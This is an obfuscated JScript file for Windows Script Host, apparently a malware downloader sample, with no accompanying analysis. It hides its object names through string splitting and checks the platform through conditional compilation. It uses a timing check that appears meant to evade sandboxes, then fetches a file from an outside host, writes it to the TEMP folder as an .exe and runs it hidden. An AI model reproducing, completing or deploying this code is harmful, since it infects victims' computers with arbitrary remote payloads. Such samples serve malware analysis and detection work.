var A0 = false;
var M = "Create"+"Object";
var Q = function JU() {return WScript[M]("WScript"+".Shell");}(), WJ = 11;
var HQ = "MSXML2"+".XMLHTTP";
var K0 = 2;
var FN = K0 - 2;
function G(LE){Q["Run"](LE, FN, FN);};
function XU(){return HQ + "";};
function P(NS, Y0){FN = FN * 1; return NS - Y0;};
function K(){return M;};
/*@cc_on
  @if (@_win32 || @_win64)
    A0 = true;
  @end
@*/
if (A0)
{
var VA = "";
function A(){return 22;};
var O = 0; var NG = 0;
function KH()
{
var CK = new this["Date"]();
var MU = CK["getUTCMilliseconds"]();
WScript["Sleep"](A());
var CK = new this["Date"]();
var OK = CK["getUTCMilliseconds"]();
WScript["Sleep"](A());
var CK = new this["Date"]();
var BV = CK["getUTCMilliseconds"]();
var O = "R";
O = P(OK, MU);
var NG = "C";
NG = P(BV, OK);
VA = "open";
return P(O, NG);
}
var RH = false;
var NM = false;
for (var XM = FN; XM < A() * 1; XM++){if (KH() != FN){
RH = true; 
NG = "31" + 11 * O + NG; 
NM = true; 
break;
}}
function I() {return ((RH == true) && (RH == NM)) ? 1 : FN;};
if (RH && I() && NM){
function Y() {return Q["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "extqGWpEr33aJO.ex" + "e";};
 S = XU();
 VO = WScript[M](S);
 var RA = 1;
do { 
	for (;RA;){
	try {
		if (RA == 1)
		{
			VO[VA]("GET", "http://be-stlines-tore.com/k3soa", false);
			VO["send"]();
			JA = "Sleep";
			RA = 2;
		}
		WScript[JA](A() + 120); 
		if (VO["readystate"] < 2 * 2) continue;
		RA = FN;
		function X(DV) {var UJ = (1, 2, 3, 4, 5, DV); return UJ;};
		K1 = WScript[K()]("ADODB.Stream");
		S = K1;
		S[VA]();
		S["type"] = X(1);
		S["write"](VO["ResponseBody"]);
		K1["position"] = X(FN);
		S["Save" + "ToFile"](Y(), 2);
		K1["cl"+"ose"]();
		YX = Y();
		G(YX);
	} catch(VV){};};
}while (RA);
}
}

